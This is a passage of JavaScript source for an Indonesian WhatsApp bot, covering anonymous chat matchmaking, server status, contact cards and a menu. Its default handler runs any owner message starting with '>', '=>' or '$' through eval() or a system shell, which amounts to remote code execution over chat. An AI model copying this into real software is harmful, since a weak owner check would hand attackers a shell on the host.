let teks = '「 LIST DATABASE 」\n\n'
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n=====================\n\n`
	}
	reply(teks)
}
break
case 'delmsg': case 'deletemsg': {
	   
    if (isBan) return reply(mess.banned)
	let msgs = global.db.database
	if (!(text.toLowerCase() in msgs)) return reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
case 'anonymous': 
  case 'ac':
	 
    if (isBan) return reply(mess.banned)
  let btn = [{
urlButton: {
displayText: 'Instagram',
url: 'https://instagram.com/cepti289'
}
}, {
quickReplyButton: {
displayText: 'START',
id: 'start'
}
}]
let txt = `${ucapanWaktu} ${pushname}`
Cepti.send5ButImg(from, txt, `ANONYMOUS CHAT HANYA BERFUNGSI DI PRIVATE CHAT

${prefix}start Untuk memulai
${prefix}next Untuk skip partner
${prefix}stop Untuk berhenti

© ${setting.botName} bot`, CeptiBotZ, btn)
	break
case 'stop': case 'keluar': case 'leave': {
  
    if (isBan) return reply(mess.banned)
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
    let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
    ]
await Cepti.sendButtonText(m.chat, buttons, '_Kamu tidak sedang berada di anonymous chat_', `© ${setting.botName} bot`)
    return false
}
reply('_You stopped matchmaking_')
let other = room.other(m.sender)
if (other) await Cepti.sendText(other, `_Partner meninggalkan chat_`, m)
delete this.anonymous[room.id]
if (command === 'leave') break
}
break
case 'mulai': case 'start': {

    if (isBan) return reply(mess.banned)
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await Cepti.sendButtonText(m.chat, buttons, `_Kamu masih berada di dalam anonymous chat, menunggu partner_`, ` © ${setting.botName} bot`, m)
 return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
    let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
    ]
    await Cepti.sendButtonText(room.a, buttons, `_Partner ditemukan!_`, ` © ${setting.botName} bot`, m)
    room.b = m.sender
    room.state = 'CHATTING'
    await Cepti.sendButtonText(room.b, buttons, `_Partner ditemukan!_`, ` © ${setting.botName} bot`, m)
} else {
    let id = + new Date
    this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
    }
    let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
    ]
    await Cepti.sendButtonText(m.chat, buttons, '_Menunggu partner..._', `© ${setting.botName} bot`, m)
}
break
}
case 'next': case 'lanjut': {
  
    if (isBan) return reply(mess.banned)
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
    let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
    ]
    await Cepti.sendButtonText(m.chat, buttons, '_Kamu tidak sedang berada di anonymous chat_', `© ${setting.botName} bot`)
    return false
}
 reply('_You stopped matchmaking_')
let other = romeo.other(m.sender)
if (other) await Cepti.sendText(other, `_Partner meninggalkan chat_`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
    let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
    ]
    await Cepti.sendButtonText(room.a, buttons, `_Partner ditemukan!_`, ` © ${setting.botName} bot`, m)
    room.b = m.sender
    room.state = 'CHATTING'
    await Cepti.sendButtonText(room.b, buttons, `_Partner ditemukan!_`, ` © ${setting.botName} bot`, m)
} else {
    let id = + new Date
    this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
    }
    let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
    ]
    await Cepti.sendButtonText(m.chat, buttons, `_Menunggu partner..._`, ` © ${setting.botName} bot`, m)
}
break
}
case 'public': {
if (!isOwner) return reply(mess.owner)
Cepti.public = true
reply('Sukse Change To Public Usage')
}
break
case 'self': {
if (!isOwner) return reply(mess.owner)
Cepti.public = false
reply('Sukses Change To Self Usage')
}
break
case 'getpp':
if (m.message.extendedTextMessage === null || m.message.extendedTextMessage === undefined) {
linkpp = await Cepti.profilePictureUrl(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
Cepti.sendMessage(m.chat, { image : { url : linkpp }, caption:`Done` }, { quoted : m })
} else if (m.message.extendedTextMessage.contextInfo.mentionedJid === null || m.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
mberr = m.message.extendedTextMessage.contextInfo.participant
linkpp = await Cepti.profilePictureUrl(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
Cepti.sendMessage(m.chat, { image : { url : linkpp }, caption:`Done` }, { quoted : m })
} else if (m.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
mberr = m.message.extendedTextMessage.contextInfo.mentionedJid[0]
linkpp = await Cepti.profilePictureUrl(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
Cepti.sendMessage(m.chat, { image : { url : linkpp }, caption:`Done` }, { quoted : m })
}
break
case 'ping': case 'botstatus': case 'statusbot': {
  
    if (isBan) return reply(mess.banned)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
	return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
    last.total += cpu.total
    last.speed += cpu.speed / length
    last.times.user += cpu.times.user
    last.times.nice += cpu.times.nice
    last.times.sys += cpu.times.sys
    last.times.idle += cpu.times.idle
    last.times.irq += cpu.times.irq
    return last
}, {
    speed: 0,
    total: 0,
    times: {
	user: 0,
	nice: 0,
	sys: 0,
	idle: 0,
	irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
reply(respon)
}
break
case 'owner': case 'creator': {
  
    if (isBan) return reply(mess.banned)
Cepti.sendContact(m.chat, setting.owner1, m)
reply('Chat aja kak, ga usah malu')
}
break
case 'owner2': case 'creator2':
  if (!isRegister) return reply(blomdaftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
  const vcard = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ `FN:${setting.ownerName}\n`
+ `ORG:${setting.deskripsi};\n`
+ `TEL;type=CELL;type=VOICE;waid=${setting.owner}:+${setting.owner}\n`
+ 'END:VCARD';
Cepti.sendMessage(from, { contacts: { contacts: [{ vcard }] }});
break
case 'infobot':
  
    if (isBan) return reply(mess.banned)
    let anubb = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)

let anubbgc = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)

reply(`•Namabot : ${setting.botName}
•Platform : ${os.platform()}
•Host name : ${os.hostname()}
•Wa Version : 2.22.13.76
•Pengguna : ${register.length}
•List Private Chat : ${anubb.length}
•List Group : ${anubbgc.length}
•Listban : ${banned.length}
`)
break
case 'menu': {
            let me = m.sender
            let jawab = `*Hai Kak ${pushname} ${ucapanWaktu} Semoga Hari Mu Menyenangkan*

╔━═━⊱ *「 USER INFO」* ━═━⬣
┃ *ダ Nomor : ${sender.split('@')[0]}*
┃ *ダ User : ${isPremium ? 'Premium' : 'Free'}*
┃ *ダ Admin : ${isAdmins ? 'Ya' : 'No'}*
┃ *ダ User: ${isPremium? 'Premium 👑' : 'Gratisan 🗿'}*
┃ *ダ Prefix : Multi Prefix*
┃ *ダ Uang : ${checkuangUser(sender)}*
┃ *ダ Limit : ${isPremium ? 'UNLIMITED' : `${checklimitUser(sender)}`}*
┗━━━━━━━━━━━━━━⬣`
 
            let buttons = [{ buttonId: 'command', buttonText: { displayText: 'Menu' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: 'Rules' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: 'Donasi' }, type: 1 }]
            let buttonMessage = {
  document: fs.readFileSync('./media/doc/fake.pptx'),
  caption: jawab,
  footer: Ceptiyt,
  buttons: buttons,
  headerType: 4,
  contextInfo:{externalAdReply:{
  title: 'ᴄᴇᴘᴛɪʙᴏᴛᴢ',
  body: 'Subscribe My YouTube', 
  showAdAttribution: true,
  thumbnail: thumb,
  mediaType: 2,
  mediaUrl: myytv,
  sourceUrl: myyt
  }}
  }
  Cepti.sendMessage(m.chat, buttonMessage, {quoted: m})
  }
 break
default:
if (budy.startsWith('sendkontak')) {
  const kasihkon = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n' 
+ `FN:${pushname}\n`
+ `ORG:${pushname};\n`
+ `TEL;type=CELL;type=VOICE;waid=${sender}:+${sender}\n`
+ 'END:VCARD';
Cepti.sendMessage(from, { contacts: { contacts: [{ kasihkon }] }});
}
if (budy.startsWith('=>')) {
    if (!isOwner) return reply(mess.owner)
    function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return reply(bang)
    }
    try {
reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
    } catch (e) {
reply(String(e))
    }
}

if (budy.startsWith('>')) {
    if (!isOwner) return reply(mess.owner)
    try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
    } catch (err) {
await reply(String(err))
    }
}

if (budy.startsWith('$')) {
    if (!isOwner) return reply(mess.owner)
    exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
    })
}
	
if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
    this.anonymous = this.anonymous ? this.anonymous : {}
    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
    if (room) {
if (/^.*(next|leave|start)/.test(m.text)) return
if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
let other = [room.a, room.b].find(user => user !== m.sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
    }
    return !0
}
	
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
Cepti.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}


    } catch (err) {
  Cepti.sendMessage(m.key.remoteJid, { text: `*[TERJADI ERROR]*\n${err}` }, { quoted: m })
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})